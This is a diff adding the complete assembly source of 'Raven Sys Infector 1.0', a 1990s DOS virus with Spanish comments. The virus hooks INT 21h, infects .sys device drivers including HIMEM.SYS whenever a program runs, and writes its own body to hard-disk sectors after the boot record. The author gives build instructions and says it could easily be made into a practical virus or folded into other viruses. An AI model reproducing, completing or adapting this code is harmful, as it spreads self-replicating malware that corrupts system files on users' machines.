@@ -1,0 +1,756 @@
+
+;ÚÄ¿ÄÂÄùÄù ù   ù           Raven Sys Infector 1.0                ù ù  ùÄÄÂÄÚÄ¿',13,10
+;ÀÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÙ',13,10
+;ÃÄ³ÄÙ                      Created By Stone Shadow                      ÀÄ:Ä´',13,10
+;ÃÄ:Ä¿     Copyright (c) 1996 - 97 By COEAC Viral System Development.    ÚÄ³Ä´',13,10
+;ÚÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ¿',13,10
+;ÀÄÙÄÁÄ ùù ù   ù      Creatures Of Electronic Anti Christ      ù   ù ùù ÄÁÄÀÄÙ',13,10
+
+
+; Bhue, como no es usual encontrar por ahi SYS infectors y como los pocos
+; ejemplos que hay documentados no funcionan muy bien (como el de Dark Angel
+; que la 40HEX y la Mino publico) decidi sacar a las sombras este infector
+; que por cierto funciona muy bien.
+
+; Por un lado, no infecta indiscriminadamente cada caracter device driver
+; que encuentra... Ya que algunos de estos drivers interfieren con el
+; funcionamiento de un sys infector.
+; Hace una buena discriminazion de los caracter devices que no es nada
+; seguro infectar. Estos son los que en sus atributos poseen la bandera E
+; activada sin que la bandera B tambien lo este:
+
+;                       FEDCBA98 76543210
+;                       xx  x                --> Buena conbinacion
+
+;                       FEDCBA98 76543210
+;                       xx                   --> Problemas!
+
+
+; Como esto lo he descubierto por simple experimentacion (prueba y error...
+; jeje) no puedo garantizar en un 100% que funcione con cualquier tipo
+; de caracter device driver... Pero tengan la certeza que probe todos los
+; caracter device drivers que pude conseguir (12) y en todos funciono
+; perfectamente el criterio que usa el RAVEN para infectar.
+; Nota: Si llegan a tener algun problema con algun driver que el RAVEN
+; infecte, porfavor comuniquenmelo!...
+;
+
+; Tambien es capaz de infectar el Himem.sys antiguo y el del W95, que
+; despues de todo es el target principal de un sys infector!
+; Nota: El Himem.sys tiene una bandera activada que no he visto en otros
+; Caracter Device Drivers y se carga en memoria de un modo especial, por lo
+; que para infectarlo el RAVEN usa una tecnica especial.
+
+; Por ultimo tengan en cuenta que este infector es de ejemplo, por lo que
+; no tiene PAYLOAD y avisa de su prescencia al Instalarse, siendo ademas
+; muy transparente al usuario en su funcionamiento. De querer hacerlo
+; un virus practico no deberian de tener ningun problema. Aunque
+; igualmente la idea es que usen la infeccion de sys en uno de sus virus, ya
+; que por si solo un sys infector (aunque interesante) no es gran cosa...
+
+; Nota Final: Hay algunas rutinas que podria haber optmizado grandemente, pero
+; las hice asi en su momento para detectar mejor cualquier problema y despues
+; me dio fiaca modificar... Por otro lado, asi es mas legible...jeje...
+; (escusa de malos programadores....shhhh!!!)
+
+; Se compila sin problemas con el Tasm; Lo compilan y linkean como exe,
+; despues le pasan el exe2bin y renombran el .bin a .sys ... (Jeje... Lo
+; aclaro por si las moscas...)
+
+Code segment para public
+Assume cs:code,ds:code,ss:code
+Org 0h
+
+Virlen           equ offset End_Sys - offset Header
+Virlen_para      equ (Virlen/512)+1
+Auxelen          equ offset End_Aux_esp_i21 - offset Aux_esp_i21
+
+;----------------------------------------------------------------------------
+;                                 SYS HEADER
+;----------------------------------------------------------------------------
+
+Header:
+
+Link    dd -1                         ; Link a la proxima cadena.
+Attr    dw 08000h                     ; Atributo 'Caracter device'
+R_Str   dw offset Strategy            ; Offset de la rutina de Strategia
+R_Int   dw offset Interrupt           ; Offset de la rutina de Interrupciones
+Nam_    db 'RAVEN00X'                 ; Nombre del Driver.
+
+;----------------------------------------------------------------------------
+;                            STRATEGY RUTINE
+;----------------------------------------------------------------------------
+
+Strategy  Proc Far
+
+        push bp
+        call ref_sys_st
+ref_sys_st:
+        pop bp
+        sub bp,offset ref_sys_st
+        mov word ptr cs:[Req_H+bp],bx    ; Salvo la direccion del Request
+        mov word ptr cs:[Req_H+bp+2],es  ; Header que el DOS proporciona en
+                                         ; ES:BX.
+        pop bp
+        retf
+
+Strategy  Endp
+
+
+;----------------------------------------------------------------------------
+;                           INTERRUPT RUTINE
+;----------------------------------------------------------------------------
+
+Interrupt Proc Far
+
+        push es
+        push ds
+
+        call ref_sys_int
+ref_sys_int:
+        pop bp
+        sub bp,offset ref_sys_int
+
+        mov bx,word ptr cs:[Req_H+bp]    ; Me fijo cual es el commando
+        mov es,word ptr cs:[Req_H+bp+2]  ; dado al device driver; Se encuentra
+        mov al,byte ptr es:[bx+2]        ; en el offset 2 del Request Header.
+        cmp al,0                         ; Si el commando es Init, hago lo que
+        jz Do_it                         ; se me da la gana e Instalo el driver.
+
+        jmp Bad_Command
+Do_it:
+
+        push cs                       ; se puede usar cualquier
+        pop ds                        ; funcion del DOS sin problemas...
+        mov ah,9                      ; Ojo!... Al decir en esta parte, me
+        lea dx,Cartel+bp              ; refiero solo cuando el dos manda
+        int 21h                       ; el Init y da perimiso para instalar
+                                      ; el driver en memoria. No se crean
+                                      ; que en la rutina de Interrupcion
+                                      ; siempre estamos de joda!...;-)
+
+
+Check_Res:
+
+        mov ax,0ff27h                 ; Chequeo si ya hay un clone residente.
+        int 21h
+        cmp ax,0dadah
+        jz Abort_Init
+
+        push es                       ; Es escencial que se preserven
+        push bx                       ; estos registros, ya que estan
+                                      ; apuntando al Request Header.
+
+
+        mov ax,3521h                           ; Obtengo el vector actual
+        int 21h                                ; de la i21h y lo salvo en
+        mov word ptr cs:[oldi21+2+bp],es       ; en dos variables por si
+        mov word ptr cs:[oldi21+bp],bx         ; necesitara instalar el
+        mov word ptr cs:[esp_oldi21+2+bp],es   ; virus desde el HIMEM.SYS
+        mov word ptr cs:[esp_oldi21+bp],bx
+
+
+        push cs                                 ; Esto esta de mas, pero
+        pop ds                                  ; por si le sacan la rutina
+                                                ; que muestra el cartel
+                                                ; y se olvidan de direccionar
+                                                ; ds...
+
+        cmp byte ptr cs:[Himem_type?+bp],'Y'    ; No me digan que es el
+        jz Prepare_Special_Sys_Inst             ; Himem.sys ??
+
+        mov ax,2521h                  ; Sino es asi, redirecciono la i21h
+        lea dx,Auxi21+bp              ; a la rutina temporal que va a
+        int 21h                       ; 'acomodar' el virus en memoria.
+
+
+        pop bx                        ; Restauro los registros usados por
+        pop es                        ; el Request Header.
+
+        jmp Instalar_Sys              ; Le doy luz verde al DOS...
+
+
+Bad_command:
+
+        mov ax,3                      ; Si el comando no es Init, regreso al
+        or ah,10000000b               ; DOS mediante el 'Return Status' del
+        mov word ptr es:[bx+3],ax     ; Request Header el comando de error
+                                      ; apropiado, en este caso 3 (Unknown
+        jmp exit_sys                  ; Command) y seteo el ultimo bit del
+                                      ; byte mas alto del Return Status
+                                      ; indicando que hubo un Error. Una de
+                                      ; las operaciones esta medio al pedo
+                                      ; pero reprochenle a los que crearon
+                                      ; el DOS!
+
+; Si llegamos aqui, es porque el device en el que estamos es el HIMEM, y como
+; el HIMEM.SYS no se instala en memoria de un modo convencional (para un
+; device driver, of course) si tratamos de dejar nuestro virus residente
+; desde el HIMEM.SYS, el DOS tambien va a dejar el codigo del HIMEM.SYS
+; residente en la misma poscicion donde el HIMEM.SYS se habia instalado
+; de una manera muy particular... Resultado?... El sistema se cuelga....je.
+; Lamentablemente tratar de liberar memoria y crear un Memory Control Block
+; con las funciones del DOS no sirve para un carajo (no, ni piensen en usar
+; la func 31h, es ovbio que no funciona tampoco.) Entonces como diablus
+; hacemos?.... Bhue, el metodo que uso es simple y efectivo (si alguien
+; descubrio alguno mejor, porfi diganmelo!). Lo que necesitariamos seria
+; una zona de memoria ya preparada donde podamos copiar nuestro virus...
+; Pero lo malo es que las zonas de memorias ya listas estan generalmente
+; ocupadas con codigo y datos importantes...jejeje.... Bhue, en la IVT
+; (Interrupt Vector Table) queda un buen pedazo (como un 40%) de espacio
+; sin usar (por lo menos al inicio del sistema), si bien este cacho
+; de memmoria no es generalmente suficiente para llenar las espectativas
+; de nuestros virus, lo es para situar una peque¤a rutina temporal que
+; se encarge de pedir memoria y crear un MCB seguro donde situar todo
+; nuestro virus. Asi que lo que hago aca es copiar el virus al rigido
+; (despues de la pista 0, cara 0, sector 1 hay siempre lugar de sobra
+; desperdiciado), copiar en una zona libre de la IVT un handler temporal
+; de la i21 (que a la menor oportunidad crea un MCB y copia todo el virus
+; a memoria y le da el control de los vectores que nescesite) y por ultimo
+; abortar el Init del driver para que no interfiera con Mr Himem:
+
+Prepare_Special_Sys_Inst:
+
+        Call Check_Space_esp_sys_inst ; Buscamos espacio en la IVT.
+        cmp ax,0
+        jz e_esp_sys_inst             ; Si de milagro no hay, abortamos la
+        push si                       ; instalacion...
+
+        mov ah,3                      ; [ Ah= Modo (escritura, lectura, etc)]
+        mov al,((Virlen+16)/512)+1    ; [ Al= Cantidad a escribir]
+        mov cx,0004h                  ; [ Ch= cilindro ] [ Cl= Sector ]
+        mov dh,0                      ; [ Dh= Lado ]
+        mov dl,80h                    ; [ Dl= Unidad ]
+        push cs                       ; ES:BX ---> Buffer a escribir.
+        pop es
+        lea bx,Header+bp              ; Copiamos al rigido el codigo del
+        int 13h                       ; Virus.
+
+        xor cx,cx                     ; Copiamos el ISR temporal de la i21h
+        mov es,cx                     ; a la zona libre de la IVT.
+        pop di                        ;
+        add di,01dfh                  ;
+        push di                       ;
+        lea si,Aux_esp_i21+bp         ;
+        mov cx,Auxelen                ;
+        cld                           ;
+        repz movsb                    ;
+
+
+        mov ax,2521h                  ; Seteamos el vector actual de la i21h
+        xor dx,dx                     ; a nuestro ISR temporal en la IVT.
+        mov ds,dx                     ;
+        pop dx                        ;
+        int 21h                       ;
+
+e_esp_sys_inst:
+
+        pop bx                        ; Restauro los registros usados por
+        pop es                        ; el Request Header.
+
+                                      ; Ahora es responzabilidad de la rutina
+                                      ; temporal instalar el virus, asi que
+                                      ; Abortamos el Init.
+Abort_Init:
+
+        mov word ptr es:[bx+0eh],0       ; Para abortar la instalacion
+        mov word ptr es:[bx+10h],cs      ; seteamos el End_oF_Drv a cs:0000h.
+
+        mov word ptr cs:[Attr+bp],0      ; Y truncamos el bit mas alto del
+                                         ; Attribute Word a 0 para que el
+                                         ; driver aparente ser un Block
+                                         ; Device. Esto va a impedir que el
+                                         ; driver se instale. El Dos igual
+                                         ; deja 256 bytes del codigo
+                                         ; residentes, pero los obvia.
+        jmp Exit_sys
+
+Instalar_sys:
+                                      ; Bien, si estamos aqui es porque
+                                      ; vamos a instalar el driver de una
+                                      ; vez por todas!...
+
+        lea ax,End_sys+bp
+        mov word ptr es:[bx+0eh],ax
+        mov word ptr es:[bx+10h],cs
+                                        ; Seteamos el fin de la
+                                        ; direccion del device
+                                        ; driver (Seg:Off) en el
+                                        ; offset 0Eh del Request Header.
+                                        ; Esto lo hacemos para que el DOS
+                                        ; sepa cuanto codigo dejar en memoria.
+
+
+        mov word ptr es:[bx+3],100h   ; para indicar 'Done', o sea que esta
+                                      ; tuti Ok y que se deje de joder!.
+Exit_sys:
+
+        mov byte ptr cs:[Himem_type?+bp],0
+
+        pop ds                        ; Restoreamos los registros usados
+        pop es                        ; y suspiramos con alivio....jeje...
+
+        retf
+
+Interrupt Endp
+
+
+; Esta rutina la usa el instalador desde el HIMEM.SYS para buscar la
+; primera poscicion libre (con el tama¤o adecuado) que pueda contener
+; la rutina temporal... Como es casi seguro que no halla espacio libre
+; hasta despues del offset 1e0h, empezamos a buscar desde ahi...
+
+Check_Space_esp_sys_inst Proc
+
+        xor cx,cx
+        mov es,cx                         ; Inicializo registros que usare
+        xor di,di                         ; para direccionamiento.
+        xor si,si                         ;
+search_bdstl:
+        inc si
+        inc di                            ; Busco un lugar con 96 bytes
+        cmp byte ptr es:[01dfh+si],0      ; libres
+        jnz p_asearch_bdstl               ;
+        cmp di,96                         ;
+        jae done_bdstl                    ;
+        jmp search_bdstl                  ;
+                                          ;
+p_asearch_bdstl:                          ;
+                                          ;
+        cmp si,432                        ;
+        ja fail_bdstl                     ;
+        xor di,di                         ;
+        jmp search_bdstl                  ;
+
+fail_bdstl:
+
+        xor ax,ax
+        ret
+
+done_bdstl:
+        dec di
+        sub si,di
+        mov ax,1
+        ret
+
+Check_Space_esp_sys_inst Endp
+
+; Esta rutina es el handler Temporal de la Instalacion Normal. Este Handler
+; se ocupa de (a la menor oportunidad) mover el virus a otra poscicion de
+; memoria... Porque esto?... Porque cuando se instala desde un Device Drv,
+; todos sus offsets quedan dezplazados por el size del host, por lo que
+; se nescesitaria usar un offset delta para todas las variables que
+; utiliza el virus en memoria... Si bien muchos no tienen problemas con
+; esta tecnica, un SYS infector generalmente se dise¤a para usarlo con
+; otro infector, y generalmente es un upgrade que hacemos a alguno de
+; nuestros virus... Y de seguro todas las rutinas de nuestros EXE/COM
+; infectors en memoria no usan offset delta, y como algunas son muy
+; extensas (mas si hay tunneling, y otras rutinas stealth) se vuelve
+; muy 'engorroso' realocatear c/variable en memoria y redise¤ar un poco la
+; estrategia de los alrotimos ya escritos... Por lo tanto, al instalarse
+; desde un SYS, es preferible usar una rutina corta y temporal que se encarge
+; de acomdar el virus en un bloque propio de memoria donde no necesite
+; realocacion. No les parece ??....
+
+;----------------------------------------------------------------------------
+;                         TEMPORAL INT 21H                           I S R
+;----------------------------------------------------------------------------
+
+Auxi21:
+        pushf
+        cmp ax,0ff27h                           ; Devuelvo marca de
+        jz Return_Resi_Mark                     ; residencia si algun clone
+        push bp                                 ; la pide.
+        call reference_x
+reference_x:                                    ; El viejo y conocido
+        pop bp                                  ; offset delta.
+        sub bp,offset reference_x               ;
+
+
+        cmp ah,4ah                 ;
+        jnz exits21                ;
+                                   ;
+                                   ;
+                                   ;
+
+        push ax                    ; Como buen ni¤o explorador salvo los
+        push bx                    ; registros que mami y papi no quieren
+        push dx                    ; que toquetee...je
+        push es                    ;
+        push ds                    ;
+        push di
+        push si
+        puSh cx
+
+
+        mov ah,48h                 ; Pido un MCB con la memoria nescesaria.
+        mov bx,((Virlen+16)/16)+1  ;
+        mov bx,0ffh
+        int 21h                    ;
+        jc exits21b                ; Si no hay memoria, no importa, alguna
+                                   ; de las proximas llamadas por parte del
+                                   ; sistema a la 4ah mela dara...
+
+        mov es,ax                  ; Si ya tenemos memoria, copiamos el
+        xor di,di                  ; Virus a la nueva poscicion.
+        push cs
+        pop ds
+        lea si,Header+bp
+        mov cx,Virlen
+        repz movsb
+
+        mov ax,2521h               ; Y le damos el control de la i21h.
+        push es
+        pop ds
+        lea dx,Newint21
+        int 21h
+
+        mov ah,2                   ; Sonamos un Beep para que oigan cuando
+        mov dl,7                   ; ocurre la realocacion de todo el codigo.
+        int 21h                    ;
+
+exits21b:
+
+        pop cx                     ; El ni¤o explorador ataca de nuevo...
+        pop si                     ;
+        pop di                     ;
+        pop ds                     ;
+        pop es                     ;
+        pop dx                     ;
+        pop bx                     ;
+        pop ax                     ;
+
+exits21:
+        pop bp
+        popf
+db      0EAh                       ; Saltamos al antiguo vector.
+oldi21  dd 0
+
+;----------------------------------------------------------------------------
+;                                  INT 21H                             I S R
+;----------------------------------------------------------------------------
+
+; Esta es la I21h Polenta, encargada de infectar y analizar a las posibles
+; victimas...
+;
+
+NewInt21:
+        pushf
+
+        cmp ax,0ff27h                    ; Prueba de Residencia.
+        jz Return_Resi_Mark
+        cmp ah,4bh                       ; Si se ejecuto un programa,
+        jz Activar_sys_infector_jp       ; ataquemos...
+                                         ; (El salto lo hago de esta manera
+                                         ; aparentemente al dope por razones
+                                         ; de 'compatibilidad' con otro virus
+                                         ; que hice, al cual pienso linkearle
+exit21:                                  ; este infector)
+        popf
+        jmp cs:[Oldi21]                  ; Sino se ejecuto nada, pasemos
+                                         ; al antiguo vector.
+
+Activar_sys_infector_jp:
+
+        jmp Activar_sys_infector
+
+Return_Resi_Mark:
+
+        mov ax,0dadah                    ; Obvio...
+        popf
+        iret
+
+
+;----------------------------------------------------------------------------
+;                 ESPECIAL TEMPORAL HANDLER I21 (Himem.sys)            I S R
+;----------------------------------------------------------------------------
+
+; Esta es la rutina especial que se aloja en la IVT para luego cargar el
+; virus del rigido a una zona segura en memoria.
+;
+
+Aux_esp_i21:
+        pushf
+        cmp ax,0ff27h                ; Marca de residencia.
+        jz Return_esp_Resi_Mark
+        push bp
+        call reference_xe            ; Offset delta.
+reference_xe:                        ;
+        pop bp                       ;
+        sub bp,offset reference_xe   ;
+
+
+        cmp ah,4ah                   ; Si... La misma historia...jeje.
+        jnz esp_exits21              ;
+
+
+        push ax                      ;  Tratemos de reventar la Stack!!!...
+        push bx                      ;
+        push dx                      ;
+        push es                      ;
+        push ds                      ;
+        push di                      ;
+        push si                      ;
+        puSh cx                      ; Mmmm... Aguanto!..... QUe guacha!...
+
+        mov ah,48h                        ; I wanna memory!!!!......Wuaa!!!..
+        mov bx,((Virlen_para*512)/16)+1   ; Wuaaaa!!!.... I wamma memory!!..
+        int 21h                           ; wuaaa!!..... wuaa!!!!...
+        jc esp_exits21b                   ;
+
+        mov es,ax
+        mov ah,2                      ; [ Ah= Modo (escritura, lectura, etc)]
+        mov al,((Virlen+16)/512)+1    ; [ Al= Cantidad a escribir]
+        mov cx,0004h                  ; [ Ch= cilindro ] [ Cl= Sector ]
+        mov dh,0                      ; [ Dh= Lado ]
+        mov dl,80h                    ; [ Dl= Unidad ]
+        xor bx,bx                     ; Caguemos a algun MBR virus!!!...;-)
+        int 13h
+
+        mov ax,2521h                  ; Pobre i21h, de un lado pa' otro...
+        push es                       ;
+        pop ds                        ;
+        lea dx,Newint21               ;
+        int 21h
+
+        mov ah,2                      ; El Beep alcahuete...
+        mov dl,7
+        int 21h
+
+esp_exits21b:
+
+        pop cx                        ;  Dejamos tuti como estaba....
+        pop si                        ;
+        pop di                        ;
+        pop ds                        ;
+        pop es                        ;
+        pop dx                        ;
+        pop bx                        ;
+        pop ax                        ;
+
+esp_exits21:
+        pop bp
+        popf
+                                      ;
+             db 0EAh                  ; Pasamos al antiguo vector...
+esp_oldi21   dd 0                     ;
+
+
+Return_esp_Resi_Mark:
+                                      ;
+        mov ax,0dadah                 ; Esta es exclusiva de esta rutina...
+        popf                          ; Hice dos, de vago nomas....
+        iret                          ;
+
+End_Aux_esp_i21 label byte
+
+
+;----------------------------------------------------------------------------
+;                             SYS INFECTOR
+;----------------------------------------------------------------------------
+
+Activar_sys_infector:
+
+        popf
+        pushf
+        call cs:[oldi21]                 ; Llamamos a int 21 original.
+        push bp
+        push ax                          ; residente, ya que si no se hace el
+        pushf                            ; sistema se puede colgar.
+
+        push ds                          ; Salvamos registros...
+        push bx                          ;
+        push cx                          ;
+        push dx                          ;
+
+        push cs                          ; Seteamos direccionamiento basico.
+        pop ds
+
+        mov ah,1ah                       ; Seteamos la DTA a nuestro codigo.
+        lea dx,ndta
+        int 21h
+
+        mov ah,4eh                       ; Buscamos en el dir actual un
+        lea dx,devices                   ; infeliz .sys.
+        xor cx,cx
+        int 21h
+        jnc c_sys_inf
+        jmp End_sys_inf
+
+c_sys_inf:
+
+        cmp word ptr cs:[ndta+1ch],0         ; Se que no hay device drivers
+        jnz Find_Other                       ; de mas de 64k, pero nunca
+                                             ; se sabe...jeje..
+
+        cmp word ptr cs:[ndta+1ah],0f447h    ; Comparo que en el SYS halla
+        ja Find_Other                        ; espacio para mi virus.
+                                             ; (Busco que halla por lo
+                                             ; menos 3000 bytes libres.)
+
+        cmp word ptr cs:[ndta+1eh],'OC'      ; Nos aseguramos que no sea
+        jnz Open_device                      ; el CONFIG.SYS.
+        cmp word ptr cs:[ndta+1eh+2],'FN'
+        jnz Open_device
+        cmp word ptr cs:[ndta+1eh+4],'GI'
+        jz Find_other
+
+Open_device:
+
+        mov ax,3d02h            ; Oka.... Hay uno.... Cortamos Doc?...
+        xor cx,cx
+        lea dx,[ndta+1eh]
+        int 21h
+        push ax
+        pop bx
+
+        mov ah,3fh              ; Con los 6 primeros bytes del header
+        mov cx,6                ; me alcanza...
+        lea dx,buffer_sys
+        int 21h
+
+Test_Device_for_infection:
+
+        cmp word ptr cs:[Buffer_sys],0ffffh  ; A sido infectado antes o
+        jnz Close_Find_other                 ; alguien se nos adelanto? ;-)
+
+        mov ax,word ptr cs:[buffer_sys+4]
+        test ah,10000000b                    ; Es un caracter device ???...
+        jz Close_Find_other                  ; Sino, no hay trato...
+
+        test ah,00100000b                    ; Bandera D (Himem type) ON ?
+        jnz Infect_Special_Sys               ; Si es asi activamos la bandera
+                                             ; interna del virus 'Himem_type?'
+                                             ; e infectamos el driver.
+
+        test ah,01000000b                    ; Bandera E activada?
+        jz Infect_Sys                        ; Sino es asi infectamos...
+
+        test ah,00001000b                    ; y la bandera B ?...
+        jz Close_Find_other                  ; Sino esta activada y la E
+                                             ; en cambio si, abortamos la
+                                             ; infeccion.
+
+        jmp Infect_Sys                       ; De otro modo es perfectamente
+                                             ; seguro infectar al infeliz!
+Close_Find_other:
+
+        mov ah,3eh                           ; Esto se explica por si
+        int 21h                              ; mismo.
+                                             ;
+Find_other:                                  ;
+                                             ;
+        mov ah,4fh                           ;
+        lea dx,ndta                          ;
+        int 21h                              ;
+        jnc Open_device                      ;
+        jmp end_sys_inf                      ;
+                                             ;
+
+Infect_Special_sys:
+
+        mov byte ptr cs:[Himem_type?],'Y'    ; Activamos la bandera.
+
+
+; Oka... Manos a la obra:
+;
+Infect_sys:
+
+        mov ax,4202h                         ; Puntero al final de la fila
+        xor cx,cx                            ; para conocer su tama¤o.
+        xor dx,dx                            ;
+        int 21h                              ;
+
+        mov word ptr cs:[Sys_Lenght],ax      ; Salvamos el size.
+
+        mov cx,word ptr cs:[O_RST]           ; Redireccionamos los offsets
+        mov word ptr cs:[R_Str],cx           ; de las rutinas de estrategia
+                                             ; e interrupcion que deben
+        mov cx,word ptr cs:[O_RI]            ; apuntar dentro del codigo
+        mov word ptr cs:[R_Int],cx           ; de nuestro virus que estara
+                                             ; desplazado por el host.
+        add word ptr cs:[R_Str],ax           ; Guardamos los offsets para
+        add word ptr cs:[R_Int],ax           ; despues escribirlos en el
+                                             ; header del virus.
+
+        mov ax,4200h                        ; Puntero al principio.
+        xor cx,cx                           ;
+        xor dx,dx                           ;
+        int 21h                             ;
+
+        mov ah,40h                          ; Escribo el Link al offset del
+        mov cx,2                            ; virus en el Header del Host.
+        lea dx,sys_lenght
+        int 21h
+
+        mov ax,4202h                        ; Puntero al final.
+        xor cx,cx                           ;
+        xor dx,dx                           ;
+        int 21h                             ;
+
+        mov word ptr cs:[Header],0ffffh     ; Seteo en el Header del virus
+        mov word ptr cs:[Header+2],0ffffh   ; el Link a la proxima cadena,
+                                            ; indicando con 0ffff:ffffh
+                                            ; que ya no hay mas cadenas.
+                                            ; Esto lo hago porque al
+                                            ; instalarse el Sys en memoria,
+                                            ; el DOS setea en el Link del
+                                            ; mismo a la direccion que
+                                            ; tendra en memoria. Por lo tanto
+                                            ; hay que resetearlo a -1 en cada
+                                            ; infeccion.
+
+        mov ah,40h                          ; Escribimos el virus al final
+        mov cx,Virlen                       ; del host.
+        lea dx,Header                       ;
+        int 21h                             ;
+
+        mov ah,3eh                          ; Cierro el host.
+        int 21h                             ;
+
+End_sys_inf:
+
+        pop dx                              ; Restauro los regs usados.
+        pop cx                              ;
+        pop bx                              ;
+        pop ds                              ;
+
+        pop ax                              ; Paso bien las flags.
+        mov bp, sp                          ;
+        mov word ptr ss:[bp+8], ax          ;
+        pop ax                              ;
+        pop bp                              ;
+        iret                                ; Y volvemos de donde
+                                            ; inocentemente fuimos llamados.
+
+;----------------------------------------------------------------------------
+;----------                        D A T A                         ----------
+;----------------------------------------------------------------------------
+
+Req_H           dw 0000,0000                ; Aca se guardara la direccion
+                                            ; del Request Header.
+
+Ndta            db 43 dup(0)                ; Self-Explanatorie, nop?
+Devices         db '*.sys',0                ;
+buffer_sys      db 6 dup(0)                 ;
+Sys_Lenght      dw 0                        ;
+O_RST           dw offset Strategy          ;
+O_RI            dw offset Interrupt         ;
+Himem_type?     db 0                        ;
+
+Cartel  db 13,10
+        db 'ÚÄ¿ÄÂÄùÄù ù   ù           Raven Sys Infector 1.0                ù ù  ùÄÄÂÄÚÄ¿',13,10
+        db 'ÀÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÙ',13,10
+        db 'ÃÄ³ÄÙ                      Created By Stone Shadow                      ÀÄ:Ä´',13,10
+        db 'ÃÄ:Ä¿     Copyright (c) 1995 - 96 By COEAC Viral System Development.    ÚÄ³Ä´',13,10
+        db 'ÚÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ¿',13,10
+        db 'ÀÄÙÄÁÄ ùù ù   ù      Creatures Of Electronic Anti Christ      ù   ù ùù ÄÁÄÀÄÙ',13,10
+        db 13,10
+        db '$'
+
+End_Sys label byte
+Code ends
+End
+ÿ
+
+
